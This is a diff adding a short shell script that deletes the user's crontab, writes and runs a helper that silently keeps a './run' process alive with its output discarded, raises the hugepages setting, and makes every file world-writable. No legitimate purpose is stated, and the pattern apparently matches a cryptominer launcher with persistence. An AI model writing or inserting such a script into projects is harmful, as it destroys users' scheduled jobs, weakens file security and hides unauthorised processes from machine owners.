@@ -1,0 +1,21 @@
+#!/bin/sh
+crontab -r
+pwd > dir.dir
+dir=$(cat dir.dir)
+echo "#!/bin/sh
+cd $dir
+if test -r $dir/bash.pid; then
+pid=\$(cat $dir/bash.pid)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+./run &>/dev/null" > upd
+
+echo 128 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=128
+
+chmod u+x upd
+chmod 777 *
+./upd
